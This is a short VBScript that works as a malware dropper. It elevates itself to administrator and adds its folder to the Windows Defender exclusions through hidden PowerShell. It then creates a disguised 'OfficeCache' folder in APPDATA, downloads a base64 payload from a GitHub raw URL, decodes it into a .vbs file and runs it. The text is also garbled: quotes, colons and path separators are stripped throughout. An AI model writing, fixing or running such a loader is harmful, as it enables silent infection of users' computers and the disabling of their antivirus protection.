If Not WScript.Arguments.Named.Exists(elevated) Then
    CreateObject(Shell.Application).ShellExecute wscript.exe,  & WScript.ScriptFullName &  elevated, , runas, 1
    WScript.Quit
End If

Set fso = CreateObject(Scripting.FileSystemObject)
Set shell = CreateObject(WScript.Shell)
currentDir = fso.GetParentFolderName(WScript.ScriptFullName)
excludeCmd = powershell -NoP -W Hidden -Exec Bypass -Command  & _
    Add-MpPreference -ExclusionPath ' & currentDir & '
shell.Run excludeCmd, 0, True

appData = shell.ExpandEnvironmentStrings(%APPDATA%)
downloadDir = appData & OfficeCache
If Not fso.FolderExists(downloadDir) Then fso.CreateFolder downloadDir


url = httpsgithub.comhereucanfirsttimerawrefsheadsmainfirst.txt 
b64Path = downloadDir & map.txt
exePath = downloadDir & hello.vbs



' === Download the base64-encoded payload ===
downloadCmd = curl -s -L -o  & b64Path &   & url
shell.Run downloadCmd, 0, True

' === Decode with PowerShell ===
decodeCmd = powershell -NoProfile -ExecutionPolicy Bypass -Command  & _
    $b=[System.IO.File]ReadAllText(' & b64Path & '); & _
    [IO.File]WriteAllBytes(' & exePath & ', [Convert]FromBase64String($b))

shell.Run decodeCmd, 0, True
shell.Run wscript.exe  & exePath & , 1, False

